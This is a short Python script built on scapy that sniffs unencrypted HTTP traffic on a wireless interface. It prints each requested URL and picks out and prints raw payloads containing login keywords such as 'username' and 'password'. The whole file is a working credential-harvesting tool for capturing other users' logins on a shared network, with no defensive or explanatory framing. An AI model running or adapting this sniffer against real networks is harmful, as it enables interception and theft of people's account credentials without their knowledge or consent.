import scapy.all as scapy
from scapy.layers import http
import os

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=print_sniffed_packets)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def user_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["email", "username", "user", "login", "password", "pass"]
        keywords = [i.encode() for i in keywords]
        for i in keywords:
            if i in load:
                return load

def print_sniffed_packets(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("Link >> " + str(url))

        password = user_info(packet)
        if password is not None:
            print("Password >> " + str(password))

if os.geteuid() != 0:
    print("This script needs root privileges. Please run with sudo.")
else:
    interface = "wlan0"

    sniff(interface)
